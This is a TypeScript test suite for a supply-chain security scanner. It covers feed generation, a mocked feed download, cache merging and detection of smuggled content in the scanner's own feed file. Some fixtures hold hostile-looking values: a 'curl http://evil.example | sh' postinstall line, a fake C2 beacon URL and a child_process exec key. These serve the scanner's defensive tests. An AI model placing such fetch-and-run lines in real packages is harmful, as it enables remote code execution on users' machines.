import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { fileURLToPath } from "node:url";
import { EventEmitter } from "node:events";

// Mock node:https before importing the module under test
vi.mock("node:https", () => {
  const mockGet = vi.fn();
  return {
    default: { get: mockGet },
    get: mockGet,
  };
});

import * as https from "node:https";
import {
  feedStats,
  refreshFeed,
  parseFeedPayload,
  DEFAULT_FEED_URL,
} from "../feed.js";
import {
  loadThreatIntel,
  checkThreatIntel,
  matchPackageIOC,
  getBundledFeed,
  FEED_CACHE_FILE,
  type FeedIOC,
} from "../threat-intel.js";

const GEN_SCRIPT_URL = new URL("../../scripts/generate-feed.mjs", import.meta.url).href;
const REPO_FEED_JSON = fileURLToPath(new URL("../../feed.json", import.meta.url));

// Not a real IOC - synthetic fixture values on the reserved .example TLD.
const EXTRA_DOMAIN = "evil-feed-refresh-test.example";
const EXTRA_DOMAIN_IOC: FeedIOC = {
  type: "domain",
  value: EXTRA_DOMAIN,
  severity: "critical",
  confidence: 1.0,
  family: "TestFamily",
  campaign: "Feed Refresh Test",
};

type ResLike = EventEmitter & { statusCode?: number };
type MockedGet = ReturnType<typeof vi.fn>;

/** Configure the mocked https.get to answer with a status + body chunks. */
function mockHttpResponse(status: number, chunks: string[]): void {
  (https.get as unknown as MockedGet).mockImplementation(
    (_url: unknown, cb: (res: ResLike) => void) => {
      const res = new EventEmitter() as ResLike;
      res.statusCode = status;
      const req = new EventEmitter();
      process.nextTick(() => {
        cb(res);
        for (const chunk of chunks) res.emit("data", Buffer.from(chunk));
        res.emit("end");
      });
      return req;
    },
  );
}

/** Configure the mocked https.get to fail with a request-level network error. */
function mockHttpError(message: string): void {
  (https.get as unknown as MockedGet).mockImplementation(
    (_url: unknown, _cb: unknown) => {
      const req = new EventEmitter();
      process.nextTick(() => req.emit("error", new Error(message)));
      return req;
    },
  );
}

let tmpDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-feed-test-"));
  (https.get as unknown as MockedGet).mockReset();
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// scripts/generate-feed.mjs
// ---------------------------------------------------------------------------

describe("generate-feed.mjs", () => {
  it("is deterministic: two runs yield byte-identical output", async () => {
    const gen = await import(/* @vite-ignore */ GEN_SCRIPT_URL);
    const first = gen.serializeFeed(gen.buildFeed());
    const second = gen.serializeFeed(gen.buildFeed());
    expect(first).toBe(second);
  });

  it("emits the published feed structure with correct counts", async () => {
    const gen = await import(/* @vite-ignore */ GEN_SCRIPT_URL);
    const feed = gen.buildFeed();
    expect(feed.schema).toBe(1);
    expect(feed.package).toBe("supply-chain-guard");
    expect(typeof feed.version).toBe("string");
    expect(Array.isArray(feed.entries)).toBe(true);
    expect(feed.entryCount).toBe(feed.entries.length);
    // Single source of truth: entries mirror the bundled TS feed exactly
    expect(feed.entries).toEqual(getBundledFeed());
  });

  it("--check passes on the committed (fresh) feed.json", async () => {
    const gen = await import(/* @vite-ignore */ GEN_SCRIPT_URL);
    const expected = gen.serializeFeed(gen.buildFeed());
    expect(gen.feedFileIsFresh(REPO_FEED_JSON, expected)).toBe(true);
  });

  it("--check fails on a tampered feed.json", async () => {
    const gen = await import(/* @vite-ignore */ GEN_SCRIPT_URL);
    const expected = gen.serializeFeed(gen.buildFeed());
    const tamperedPath = path.join(tmpDir, "feed.json");
    fs.writeFileSync(tamperedPath, expected.replace('"schema": 1', '"schema": 2'));
    expect(gen.feedFileIsFresh(tamperedPath, expected)).toBe(false);
  });

  it("--check fails when feed.json is missing", async () => {
    const gen = await import(/* @vite-ignore */ GEN_SCRIPT_URL);
    const expected = gen.serializeFeed(gen.buildFeed());
    expect(gen.feedFileIsFresh(path.join(tmpDir, "nope.json"), expected)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// feed stats
// ---------------------------------------------------------------------------

describe("feedStats", () => {
  it("counts entries by type and severity", () => {
    const feed: FeedIOC[] = [
      { type: "domain", value: "a.example", severity: "critical", confidence: 1.0 },
      { type: "domain", value: "b.example", severity: "high", confidence: 0.9 },
      { type: "ip", value: "192.0.2.1", severity: "critical", confidence: 1.0 },
      { type: "package", value: "some-pkg", severity: "medium", confidence: 0.8 },
    ];
    const stats = feedStats(feed);
    expect(stats.total).toBe(4);
    expect(stats.byType).toEqual({ domain: 2, ip: 1, package: 1 });
    expect(stats.bySeverity).toEqual({ critical: 2, high: 1, medium: 1 });
  });

  it("handles an empty feed", () => {
    const stats = feedStats([]);
    expect(stats.total).toBe(0);
    expect(stats.byType).toEqual({});
    expect(stats.bySeverity).toEqual({});
  });

  it("adds up over the bundled feed", () => {
    const bundled = getBundledFeed();
    const stats = feedStats(bundled);
    expect(stats.total).toBe(bundled.length);
    const typeSum = Object.values(stats.byType).reduce((a, b) => a + b, 0);
    const sevSum = Object.values(stats.bySeverity).reduce((a, b) => a + b, 0);
    expect(typeSum).toBe(bundled.length);
    expect(sevSum).toBe(bundled.length);
    expect(stats.byType["package"]).toBeGreaterThan(0);
    expect(stats.bySeverity["critical"]).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// parseFeedPayload
// ---------------------------------------------------------------------------

describe("parseFeedPayload", () => {
  it("accepts the published { schema, entries } shape", () => {
    const raw = JSON.stringify({ schema: 1, entries: [EXTRA_DOMAIN_IOC] });
    expect(parseFeedPayload(raw)).toHaveLength(1);
  });

  it("accepts a raw FeedIOC[] array (legacy shape)", () => {
    const raw = JSON.stringify([EXTRA_DOMAIN_IOC]);
    expect(parseFeedPayload(raw)).toHaveLength(1);
  });

  it("rejects non-JSON payloads", () => {
    expect(() => parseFeedPayload("<html>not json</html>")).toThrow(/not valid JSON/);
  });

  it("rejects payloads without an entries array", () => {
    expect(() => parseFeedPayload('{"schema":1}')).toThrow(/entries array/);
    expect(() => parseFeedPayload('{"schema":1,"entries":[]}')).toThrow(/entries array/);
  });

  it("rejects malformed entries", () => {
    expect(() =>
      parseFeedPayload('{"entries":[{"type":"domain"}]}'),
    ).toThrow(/type\/value\/severity/);
  });
});

// ---------------------------------------------------------------------------
// feed refresh (mocked node:https)
// ---------------------------------------------------------------------------

describe("refreshFeed", () => {
  it("downloads the published feed and writes the cache loadThreatIntel reads", async () => {
    const body = JSON.stringify({
      schema: 1,
      package: "supply-chain-guard",
      version: "9.9.9",
      entryCount: 1,
      entries: [EXTRA_DOMAIN_IOC],
    });
    mockHttpResponse(200, [body]);

    const result = await refreshFeed("https://feed.invalid/feed.json", tmpDir);
    expect(result.entryCount).toBe(1);
    expect(result.cachePath).toBe(path.join(tmpDir, FEED_CACHE_FILE));
    expect(https.get).toHaveBeenCalledOnce();

    const cached = JSON.parse(fs.readFileSync(result.cachePath, "utf-8")) as {
      timestamp: string;
      entries: FeedIOC[];
    };
    expect(typeof cached.timestamp).toBe("string");
    expect(cached.entries).toHaveLength(1);

    // End-to-end: the dormant loader merges the refreshed cache over the bundle
    const feed = loadThreatIntel(tmpDir);
    expect(feed.length).toBe(getBundledFeed().length + 1);
    expect(feed.some((i) => i.value === EXTRA_DOMAIN)).toBe(true);
  });

  it("handles a body split across multiple data chunks", async () => {
    const body = JSON.stringify({ schema: 1, entries: [EXTRA_DOMAIN_IOC] });
    const mid = Math.floor(body.length / 2);
    mockHttpResponse(200, [body.slice(0, mid), body.slice(mid)]);

    const result = await refreshFeed("https://feed.invalid/feed.json", tmpDir);
    expect(result.entryCount).toBe(1);
  });

  it("defaults to the published GitHub raw URL", async () => {
    mockHttpResponse(200, [JSON.stringify({ schema: 1, entries: [EXTRA_DOMAIN_IOC] })]);
    await refreshFeed(undefined, tmpDir);
    expect((https.get as unknown as MockedGet).mock.calls[0][0]).toBe(DEFAULT_FEED_URL);
    expect(DEFAULT_FEED_URL).toContain(
      "raw.githubusercontent.com/homeofe/supply-chain-guard/main/feed.json",
    );
  });

  it("rejects with a clear error when the network is down (no crash)", async () => {
    mockHttpError("getaddrinfo ENOTFOUND raw.githubusercontent.com");
    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir)).rejects.toThrow(
      /Failed to refresh threat feed.*network error.*ENOTFOUND/,
    );
    expect(fs.existsSync(path.join(tmpDir, FEED_CACHE_FILE))).toBe(false);
  });

  it("rejects on non-200 HTTP status", async () => {
    mockHttpResponse(404, ["Not Found"]);
    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir)).rejects.toThrow(
      /Failed to refresh threat feed.*HTTP 404/,
    );
  });

  it("rejects on invalid payloads without writing the cache", async () => {
    mockHttpResponse(200, ["<html>rate limited</html>"]);
    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir)).rejects.toThrow(
      /Failed to refresh threat feed.*not valid JSON/,
    );
    expect(fs.existsSync(path.join(tmpDir, FEED_CACHE_FILE))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// cached-feed consumption (the dormant machinery the refresh feeds into)
// ---------------------------------------------------------------------------

describe("cached-feed consumption at scan time", () => {
  function writeCache(entries: FeedIOC[], ageMs = 0): void {
    fs.writeFileSync(
      path.join(tmpDir, FEED_CACHE_FILE),
      JSON.stringify({
        timestamp: new Date(Date.now() - ageMs).toISOString(),
        entries,
      }),
    );
  }

  it("a refreshed cache entry is picked up by the threat-intel lookup", () => {
    writeCache([EXTRA_DOMAIN_IOC]);

    const feed = loadThreatIntel(tmpDir);
    expect(feed.length).toBe(getBundledFeed().length + 1);

    const content = `const c2 = "https://${EXTRA_DOMAIN}/beacon";`;
    const findings = checkThreatIntel(content, "src/payload.js", feed);
    expect(findings.length).toBe(1);
    expect(findings[0].rule).toBe("THREAT_INTEL_MATCH");
    expect(findings[0].severity).toBe("critical");
    expect(findings[0].category).toBe("malware");
    expect(findings[0].confidence).toBeGreaterThan(0);
  });

  it("a refreshed package IOC extends ecosystem matching", () => {
    writeCache([
      {
        type: "package",
        value: "ruby:evil-extra-gem-feed-test",
        severity: "critical",
        confidence: 0.95,
        family: "TestFamily",
        campaign: "Feed Refresh Test",
      },
    ]);
    const feed = loadThreatIntel(tmpDir);
    expect(matchPackageIOC("ruby", "evil-extra-gem-feed-test", "1.0.0", feed)).not.toBeNull();
    expect(matchPackageIOC("ruby", "evil-extra-gem-feed-test", "1.0.0", getBundledFeed())).toBeNull();
  });

  it("does not merge a stale cache (older than 24h)", () => {
    writeCache([EXTRA_DOMAIN_IOC], 48 * 60 * 60 * 1000);
    const feed = loadThreatIntel(tmpDir);
    expect(feed.length).toBe(getBundledFeed().length);
    expect(feed.some((i) => i.value === EXTRA_DOMAIN)).toBe(false);
  });

  it("ignores a corrupt cache file", () => {
    fs.writeFileSync(path.join(tmpDir, FEED_CACHE_FILE), "{not json");
    const feed = loadThreatIntel(tmpDir);
    expect(feed.length).toBe(getBundledFeed().length);
  });

  it("does not duplicate entries already in the bundled feed", () => {
    const bundled = getBundledFeed();
    writeCache([bundled[0]]);
    const feed = loadThreatIntel(tmpDir);
    expect(feed.length).toBe(bundled.length);
  });
});

// ---------------------------------------------------------------------------
// isInertThreatFeedFile - the scanner must skip its own inert feed data, but
// ONLY when it is structurally pure (v5.4.0 dogfooding: the published
// feed.json produced 169 phantom criticals on this very repo).
// ---------------------------------------------------------------------------

describe("isInertThreatFeedFile", () => {
  const goodDoc = JSON.stringify({
    schema: 1,
    package: "supply-chain-guard",
    version: "5.4.0",
    entryCount: 2,
    entries: [
      { type: "domain", value: "evil-c2.example", severity: "critical", confidence: 1.0 },
      { type: "package", value: "bad-pkg@1.0.0", severity: "high", confidence: 0.9, campaign: "Test" },
    ],
  });

  it("accepts the published feed document shape under feed.json", async () => {
    const { isInertThreatFeedFile } = await import("../threat-intel.js");
    expect(isInertThreatFeedFile("feed.json", goodDoc)).toBe(true);
    expect(isInertThreatFeedFile("sub/dir/feed.json", goodDoc)).toBe(true);
  });

  it("accepts the cache shape under threat-feed.json", async () => {
    const { isInertThreatFeedFile } = await import("../threat-intel.js");
    const cacheDoc = JSON.stringify({
      timestamp: "2026-07-02T00:00:00Z",
      entries: [{ type: "ip", value: "192.0.2.99", severity: "critical", confidence: 1.0 }],
    });
    expect(isInertThreatFeedFile("threat-feed.json", cacheDoc)).toBe(true);
  });

  it("rejects other filenames even with a valid feed body", async () => {
    const { isInertThreatFeedFile } = await import("../threat-intel.js");
    expect(isInertThreatFeedFile("data.json", goodDoc)).toBe(false);
  });

  it("rejects a feed.json with an extra top-level key (smuggling)", async () => {
    const { isInertThreatFeedFile } = await import("../threat-intel.js");
    const doc = JSON.parse(goodDoc);
    doc.postinstall = "curl http://evil.example | sh";
    expect(isInertThreatFeedFile("feed.json", JSON.stringify(doc))).toBe(false);
  });

  it("rejects entries with unknown keys or non-scalar values", async () => {
    const { isInertThreatFeedFile } = await import("../threat-intel.js");
    const extraKey = JSON.parse(goodDoc);
    extraKey.entries[0].exec = "require('child_process')";
    expect(isInertThreatFeedFile("feed.json", JSON.stringify(extraKey))).toBe(false);
    const nested = JSON.parse(goodDoc);
    nested.entries[0].value = { $ref: "http://evil.example" };
    expect(isInertThreatFeedFile("feed.json", JSON.stringify(nested))).toBe(false);
  });

  it("rejects a foreign package claim and invalid JSON", async () => {
    const { isInertThreatFeedFile } = await import("../threat-intel.js");
    const foreign = JSON.parse(goodDoc);
    foreign.package = "totally-legit-scanner";
    expect(isInertThreatFeedFile("feed.json", JSON.stringify(foreign))).toBe(false);
    expect(isInertThreatFeedFile("feed.json", "{ not json")).toBe(false);
  });

  it("integration: a repo containing the real published feed.json scans clean", async () => {
    const { scan } = await import("../scanner.js");
    const repoFeed = fs.readFileSync(
      path.join(path.dirname(fileURLToPath(import.meta.url)), "../../feed.json"),
      "utf-8",
    );
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-feedskip-"));
    try {
      fs.writeFileSync(path.join(dir, "feed.json"), repoFeed);
      fs.writeFileSync(path.join(dir, "index.js"), "console.log('hello');\n");
      const report = await scan({ target: dir, format: "json" });
      const feedFindings = report.findings.filter((f) => (f.file ?? "").includes("feed.json"));
      expect(feedFindings).toHaveLength(0);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});
